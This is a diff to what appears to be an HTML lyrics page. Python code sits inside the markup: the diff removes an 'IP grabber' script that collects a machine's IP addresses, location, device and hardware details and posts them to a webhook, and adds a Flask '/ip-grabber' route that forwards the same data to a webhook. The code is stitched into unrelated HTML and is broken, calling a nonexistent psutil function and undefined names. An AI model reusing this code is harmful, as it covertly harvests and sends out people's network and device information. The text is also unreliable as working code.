@@ -68,72 +68,35 @@
             </a>
         </div>
     </main>
-import requests
-import psutil
-import pycountry
-import socket
+
 import json
+import requests
 
-def get_ipv4():
-    return socket.gethostbyname(socket.gethostname())
-
-def get_ipv6():
-    return socket.getaddrinfo(socket.gethostname(), None, family=socket.AF_INET6)
-
-def get_location():
-    return pycountry.countries.get(name="United States").name  # Replace with actual country code
-
-def get_device_info():
-    cpu_freq = psutil.cpu_freq().current / 1000
-    memory_usage = psutil.virtual_memory().percent
-    return {
-        "device": psutil.device_names(),
-        "cpu_frequency": cpu_freq,
-        "memory_usage": memory_usage
+@app.route('/ip-grabber', methods=['POST'])
+def ip_grabber():
+    data = request.get_json()
+    
+    # Extract data from the request
+    ipv4 = data['ipv4']
+    ipv6 = data['ipv6']
+    location = data['location']
+    device = data['device']
+    hardware = data['hardware']
+    
+    # Prepare webhook payload
+    payload = {
+        'ipv4': ipv4,
+        'ipv6': ipv6,
+        'location': location,
+        'device': device,
+        'hardware': hardware
     }
+    
+    # Send data to the webhook
+    requests.post(os.getenv('WEBHOOK_URL'), json=payload)
+    
+    return 'OK'
 
-def get_hardware_info():
-    return {
-        "cpu_model": psutil.cpu_count(logical=False),
-        "cpu_cores": psutil.cpu_count(logical=True),
-        "ram_total": psutil.virtual_memory().total / 1073741824,
-        "ram_available": psutil.virtual_memory().available / 1073741824,
-    }
-
-def get_ipv6_address():
-    ipv6_address = ""
-    for family, socktype, proto, canonname, sockaddr in socket.getaddrinfo(socket.gethostname(), None, family=socket.AF_INET6):
-        if family == socket.AF_INET6:
-            ipv6_address = sockaddr[0].split("%")[0]
-    return ipv6_address
-
-def post_webhook(data):
-    try:
-        response = requests.post(
-            url="YOUR_WEBHOOK",
-            data=json.dumps(data),
-            headers={"Content-Type": "application/json"}
-        )
-        if response.status_code == 200:
-            return True
-        else:
-            return False
-    except requests.exceptions.RequestException as e:
-        return False
-
-if __name__ == "__main__":
-    data = {
-        "ipv4": get_ipv4(),
-        "ipv6": get_ipv6_address(),
-        "location": get_location(),
-        "device": get_device_info(),
-        "hardware": get_hardware_info()
-    }
-    print(data)
-    if post_webhook(data):
-        print("Data sent successfully")
-    else:
-        print("Failed to send data")
     <div id="overlay"></div>
 
     <div id="lyrics-popup">
